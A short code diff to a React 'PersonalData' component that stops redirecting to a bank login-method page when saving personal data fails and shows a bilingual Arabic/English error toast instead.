@@ -74,7 +74,7 @@ export default function PersonalData() {
       setLocation(`/login-method?bank=${bank}&session=${currentSessionId}`);
     } catch (error) {
       console.error("Error saving personal data in DB:", error);
-      setLocation(`/login-method?bank=${bank}&session=${currentSessionId}`);
+      toast.error(isArabic ? "فشل حفظ البيانات، يرجى المحاولة مرة أخرى" : "Failed to save data, please try again");
     }
   };
 
